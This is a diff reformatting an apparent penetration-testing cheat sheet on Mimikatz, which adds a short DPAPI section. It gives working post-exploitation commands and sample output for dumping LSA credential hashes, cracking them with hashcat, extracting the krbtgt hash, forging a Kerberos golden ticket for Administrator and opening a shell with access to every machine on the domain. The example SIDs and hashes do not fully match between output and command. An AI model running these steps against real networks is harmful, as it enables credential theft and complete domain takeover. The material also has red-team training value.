@@ -1,42 +1,57 @@
-## Mimikatz
-### Tables of Contents
-- [Mimikatz](#mimikatz)
-  * [Tables of Contents](#tables-of-contents)
-  * [Run](#run)
-  * [Dump hashes](#dump-hashes)
-  * [Crack with hashcat](#crack-with-hashcat)
-  * [Golden Ticket](#golden-ticket)
-  * [Create the Golden Ticket](#create-the-golden-ticket)
-  * [Use the Ticket](#use-the-ticket)
+# Mimikatz
 
-- Mimikatz is a very popular and powerful post-exploitation tool mainly used for dumping user credentials inside of a active directory network
-- Transfer mimikatz.exe to the target
-### Run
-````
+## Tables of Contents
+
+* [Mimikatz](mimikatz.md#mimikatz)
+  * [Tables of Contents](mimikatz.md#tables-of-contents)
+  * [Run](mimikatz.md#run)
+  * [Dump hashes](mimikatz.md#dump-hashes)
+  * [Crack with hashcat](mimikatz.md#crack-with-hashcat)
+  * [Golden Ticket](mimikatz.md#golden-ticket)
+  * [Create the Golden Ticket](mimikatz.md#create-the-golden-ticket)
+  * [Use the Ticket](mimikatz.md#use-the-ticket)
+  * [DPAPI](mimikatz.md#dpapi)
+* Mimikatz is a very popular and powerful post-exploitation tool mainly used for dumping user credentials inside of a active directory network
+* Transfer mimikatz.exe to the target
+
+## Run
+
+```
 ./mimikatz.exe
-````
-- Ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator.
-- If you don't run mimikatz as an administrator, mimikatz will not run properly
-````
+```
+
+* Ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator.
+* If you don't run mimikatz as an administrator, mimikatz will not run properly
+
+```
 privilege::debug 
-````
-### Dump hashes
-````
+```
+
+## Dump hashes
+
+```
 lsadump::lsa /patch
-````
-### Crack with hashcat
-````
+```
+
+## Crack with hashcat
+
+```
 hashcat -m 1000 <hash> rockyou.txt
-````
-### Golden Ticket
-- Again using the mimikatz as the previous task; however, this time we'll be using it to create a golden ticket.
-- We will first dump the hash and sid of the krbtgt user then create a golden ticket and use that golden ticket to open up a new command prompt allowing us to access any machine on the network.
-- This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket
-````
+```
+
+## Golden Ticket
+
+* Again using the mimikatz as the previous task; however, this time we'll be using it to create a golden ticket.
+* We will first dump the hash and sid of the krbtgt user then create a golden ticket and use that golden ticket to open up a new command prompt allowing us to access any machine on the network.
+* This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket
+
+```
 lsadump::lsa /inject /name:krbtgt
-````
-- Output should look like this:
-````
+```
+
+* Output should look like this:
+
+```
 mimikatz # lsadump::lsa /inject /name:krbtgt 
 Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 
 
@@ -96,23 +111,30 @@ User : krbtgt
 
  * NTLM-Strong-NTOWF
     Random Value : 666caaaaf30081f30211bd7fa445fec4 
-````
-### Create the Golden Ticket
-- You will need the:
-- Domain SID (S-1-5-21-849420856-2351964222-986696166)
-- USER (krbtgt)
-- NTLM (5508500012cc005cf7082a9a89ebdfd)
-- Create a Golden Ticket
-````
+```
+
+## Create the Golden Ticket
+
+* You will need the:
+* Domain SID (S-1-5-21-849420856-2351964222-986696166)
+* USER (krbtgt)
+* NTLM (5508500012cc005cf7082a9a89ebdfd)
+* Create a Golden Ticket
+
+```
 kerberos::golden /user: /domain: /sid: /krbtgt: /id:
-````
-- To create a golden ticket based on the output above we would use:
-````
+```
+
+* To create a golden ticket based on the output above we would use:
+
+```
 Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-3893474861-143125734-211
 2006029 /krbtgt:78558f004296a6f9438f4532164a7acd /id:500
-````
-- Output should look like this:
-````
+```
+
+* Output should look like this:
+
+```
 User      : Administrator 
 Domain    : controller.local (CONTROLLER)
 SID       : S-1-5-21-3893474861-143125734-2112006029
@@ -129,18 +151,26 @@ Lifetime  : 8/8/2021 4:37:58 PM ; 8/6/2031 4:37:58 PM ; 8/6/2031 4:37:58 PM
  * KrbCred generated
 
 Final Ticket Saved to file !
-````
-### Use the Ticket
-- Use the Golden Ticket to access other machines:
-````
+```
+
+## Use the Ticket
+
+* Use the Golden Ticket to access other machines:
+
+```
 misc::cmd
-````
-- This will open a new command prompt with elevated privlages to all machines
-- Access other Machines! - You will now have another command prompt with access to all other machines on the network
+```
 
+* This will open a new command prompt with elevated privlages to all machines
+* Access other Machines! - You will now have another command prompt with access to all other machines on the network
 
+## DPAPI&#x20;
 
+* Credit for below section:
+* [https://hunter2.gitbook.io/darthsidious/privilege-escalation/mimikatz  ](https://hunter2.gitbook.io/darthsidious/privilege-escalation/mimikatz)
 
+```
+mimikatz # sekurlsa::dpapi
+```
 
-
-
+* See blog post&#x20;
